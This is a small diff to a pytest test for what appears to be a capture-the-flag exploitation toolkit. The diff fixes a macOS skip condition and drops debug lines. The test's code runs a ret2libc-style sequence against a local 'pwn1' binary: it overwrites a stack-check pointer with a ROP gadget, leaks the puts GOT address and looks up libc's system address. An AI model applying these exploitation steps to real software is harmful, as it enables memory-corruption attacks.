@@ -8,11 +8,8 @@ import pytest
 import platform
 
 @pytest.mark.skipif(platform.uname()[0] == 'Windows', reason='skip windows')
-@pytest.mark.skipif(platform.uname()[0] == 'Mac', reason='skip mac')
+@pytest.mark.skipif(platform.uname()[0] == 'Darwin', reason='skip mac')
 def test_pwn1():
-    print('current uname')
-    print(platform.uname())
-    
     path = get_elf_resources('pwn1')
     config = gb.GameBoxConfig(
         is_local=True,
@@ -68,7 +65,6 @@ def test_pwn1():
     gb.close()
     for db_index, libc_version in enumerate(s.db):
         try:
-            gb.pause()
             gb.set_config(config)
             edit_addr_value(stk_chk, gb.p64(pops['ret'])) # invalid stk_chk
 
@@ -76,8 +72,8 @@ def test_pwn1():
             gb.log.info(f'puts_got:{hex(puts_got)}')
             s.set_offset_by_function('puts', puts_got)
             gb.log.info(f'offset set to:{hex(s.offset)}')
-
             gb.log.info(f'try libc_version:{libc_version}')
+
             data = s.dump(db_index=db_index)
 
             libc_system = s.get_address(sgtlibc.s_system)
